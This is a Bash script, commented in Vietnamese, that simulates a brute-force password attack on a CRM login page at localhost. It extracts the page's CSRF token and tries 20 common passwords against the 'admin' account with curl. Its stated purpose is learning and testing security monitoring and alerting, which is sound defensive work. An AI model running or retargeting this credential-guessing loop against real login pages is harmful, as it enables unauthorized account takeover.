#!/usr/bin/env bash
# ==============================================================================
# Script mô phỏng tấn công dò mật khẩu (Brute Force) vào trang đăng nhập CRM
# Mục đích: Phục vụ học tập, kiểm thử hệ thống giám sát và cảnh báo ATTT
# ==============================================================================
set -e

BASE_URL="https://localhost"
LOGIN_URL="${BASE_URL}/auth/login"
COOKIE_JAR="/tmp/bf_cookie.txt"
USER_TARGET="admin"
PASSWORDS=(
  "password123" "admin123" "12345678" "qwerty2026" "welcome123"
  "letmein2026" "dragon99" "monkey123" "iloveyou01" "secret2026"
  "admin@2026" "root12345" "master999" "pass@1234" "shadow2026"
  "football2026" "superadmin" "crm_admin!" "access2026" "finalguess!"
)

echo "=================================================================="
echo " BẮT ĐẦU MÔ PHỎNG TẤN CÔNG DÒ MẬT KHẨU (BRUTE FORCE ATTACK)"
echo " Mục tiêu: ${LOGIN_URL}"
echo " Tài khoản: ${USER_TARGET}"
echo " Số lượng yêu cầu: 20"
echo " Thời gian: $(date -u +"%Y-%m-%d %H:%M:%SZ")"
echo "=================================================================="

rm -f "$COOKIE_JAR"

for i in {0..19}; do
  ATTEMPT=$((i + 1))
  PASS="${PASSWORDS[$i]}"
  NOW=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

  # 1. Lấy trang đăng nhập, trích xuất CSRF token và Cookie phiên
  LOGIN_HTML=$(curl -k -s -c "$COOKIE_JAR" "$LOGIN_URL")
  CSRF_TOKEN=$(echo "$LOGIN_HTML" | grep -o 'name="_csrf"[^>]*' | sed -E 's/.*value="([^"]+)".*/\1/')

  if [ -z "$CSRF_TOKEN" ]; then
    echo "[$NOW] [#${ATTEMPT}/20] Lỗi: Không trích xuất được mã CSRF!"
    continue
  fi

  # 2. Gửi yêu cầu POST đăng nhập sai
  HTTP_CODE=$(curl -k -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -o /dev/null -w "%{http_code}" \
    -X POST \
    -d "username=${USER_TARGET}" \
    -d "password=${PASS}" \
    -d "_csrf=${CSRF_TOKEN}" \
    "$LOGIN_URL")

  echo "[$NOW] [#${ATTEMPT}/20] Thử mật khẩu: '${PASS}' -> HTTP Code: ${HTTP_CODE}"
  
  # Giãn cách khoảng ~0.5 giây giữa các lần thử
  sleep 0.5
done

rm -f "$COOKIE_JAR"

echo "=================================================================="
echo " KẾT THÚC MÔ PHỎNG TẤN CÔNG TẠI: $(date -u +"%Y-%m-%d %H:%M:%SZ")"
echo "=================================================================="
